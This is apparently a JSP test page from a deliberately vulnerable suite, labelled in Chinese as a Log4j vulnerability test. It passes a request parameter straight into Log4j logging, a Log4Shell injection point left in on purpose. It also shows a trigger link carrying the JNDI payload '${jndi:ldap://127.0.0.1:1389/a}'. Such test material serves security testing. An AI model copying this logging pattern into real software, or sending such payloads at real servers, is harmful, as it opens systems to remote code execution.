<%@page import="java.io.*" %>
<%@page import="java.util.*" %>
<%@page import="java.net.*" %>
<%@page import="org.apache.logging.log4j.Logger"%>
<%@page import="org.apache.logging.log4j.LogManager"%>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>022 - Log4j漏洞测试</title>
</head>
<body>
<h1>022 - Log4j漏洞测试</h1>
<%!
String encodeValue(String value) 
{
    try {
        return URLEncoder.encode(value, "UTF-8");
    } catch (UnsupportedEncodingException ex) {
        throw new RuntimeException(ex.getCause());
    }
}
%>
<%
	String defaultQuery = "${jndi:ldap://127.0.0.1:1389/a}";
	Logger logger = LogManager.getLogger(this.getClass());
    String log = request.getParameter("log");
    if (log != null) {
        logger.error(log);
    }
%>
<p>触发: </p>
<p>curl '<a href="<%=request.getRequestURL()+ "?log=" + encodeValue(defaultQuery)%>"
            target="_blank"><%=request.getRequestURL() + "?log=" + defaultQuery%>
</a>'</p>
<br>
</body>
</html>
